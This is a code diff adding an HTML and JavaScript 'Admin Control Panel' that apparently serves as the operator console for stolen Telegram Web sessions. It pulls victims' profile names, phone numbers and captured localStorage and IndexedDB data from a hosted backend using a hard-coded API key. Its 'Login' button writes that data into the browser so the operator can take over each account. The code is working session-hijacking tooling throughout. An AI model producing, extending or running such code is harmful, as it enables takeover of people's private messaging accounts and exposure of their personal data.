@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f9; padding: 30px; margin: 0; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h2 { color: #333; border-bottom: 2px solid #0063bb; padding-bottom: 10px; }
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+        .btn-primary { background: #0063bb; color: white; }
+        .btn-success { background: #28a745; color: white; padding: 8px 15px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; text-align: left; }
+        th, td { padding: 12px; border-bottom: 1px solid #eee; }
+        th { background: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Admin Control Panel</h2>
+        <button id='loadBtn' class="btn-primary">Load Accounts</button>
+        <div id='admin-content' style='margin-top: 20px;'></div>
+    </div>
+
+    <script>
+        const BACKEND_URL = "https://kmt285476-telegram.hf.space";
+        const API_KEY = "tg_custom_secret_key_2026";
+        window.adminDataStore = [];
+
+        // Note: We need base64ToBuffer and importIndexedDB here to restore session
+        function base64ToBuffer(base64) {
+            const binary_string = window.atob(base64);
+            const len = binary_string.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        function deserializeData(jsonStr) {
+            return JSON.parse(jsonStr, (key, value) => {
+                if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
+                if (value && typeof value === 'object' && value.__type === 'Uint8Array') return new Uint8Array(base64ToBuffer(value.data));
+                return value;
+            });
+        }
+
+        async function importIndexedDB(dbName, storeName, data) {
+            return new Promise((resolve, reject) => {
+                const request = indexedDB.open(dbName);
+                request.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    if (!db.objectStoreNames.contains(storeName)) db.createObjectStore(storeName);
+                };
+                request.onsuccess = (e) => {
+                    const db = e.target.result;
+                    if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
+                    const tx = db.transaction(storeName, "readwrite");
+                    const store = tx.objectStore(storeName);
+                    const clearReq = store.clear();
+                    clearReq.onsuccess = () => {
+                        const keys = Object.keys(data);
+                        if (keys.length === 0) { resolve(); return; }
+                        let putCount = 0;
+                        for (const key of keys) {
+                            const putReq = store.put(data[key], key);
+                            putReq.onsuccess = () => { putCount++; if (putCount === keys.length) resolve(); };
+                            putReq.onerror = () => reject(new Error("Failed to put key: " + key));
+                        }
+                    };
+                };
+            });
+        }
+
+        window.loginAs = async (index) => {
+            const session = window.adminDataStore[index];
+            if(!session) return;
+            if(!confirm((session.profile_name || session.user_id) + " Login Sure?")) return;
+            try {
+                localStorage.clear();
+                localStorage.setItem("is_admin_view", "true"); 
+                if (session.local_storage_str) {
+                    const ls = JSON.parse(session.local_storage_str);
+                    for (const key in ls) { localStorage.setItem(key, ls[key]); }
+                }
+                if (session.indexed_db_str) {
+                    const idbData = deserializeData(session.indexed_db_str);
+                    await importIndexedDB("tt-data", "store", idbData);
+                }
+                // Redirect back to main telegram web
+                window.location.href = "/"; 
+            } catch (e) { alert("Error: " + e.message); }
+        };
+
+        const adminPass = prompt("Admin Panel Pass:");
+        if (!adminPass) { window.location.href = "/"; }
+
+        document.getElementById("loadBtn").addEventListener("click", async () => {
+            const contentDiv = document.getElementById("admin-content");
+            contentDiv.innerHTML = "<p style='color: blue;'>Fetching data...</p>";
+            try {
+                const res = await fetch(BACKEND_URL + "/api/get_sessions", { 
+                    headers: { "x-api-key": API_KEY, "x-admin-password": adminPass } 
+                });
+                if (!res.ok) throw new Error(`Server Error: ${res.status}`);
+                const data = await res.json();
+                window.adminDataStore = data; 
+                if(data.length === 0) { contentDiv.innerHTML = "<p style='color: red;'>No Data</p>"; return; }
+                
+                let html = "<table><tr><th>Profile Info</th><th>Phone</th><th>Action</th></tr>";
+                data.forEach((s, index) => {
+                    const isReady = s.local_storage_str ? true : false;
+                    const pName = s.profile_name || "Unknown";
+                    html += `<tr>
+                                <td><b>${pName}</b><br><span style="font-size:12px;">ID: ${s.user_id}</span></td>
+                                <td>${s.profile_phone || 'No Phone'}</td>
+                                <td><button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} class='btn-success'>Login</button></td>
+                             </tr>`;
+                });
+                html += "</table>";
+                contentDiv.innerHTML = html;
+            } catch (err) { contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; }
+        });
+    </script>
+</body>
+</html>
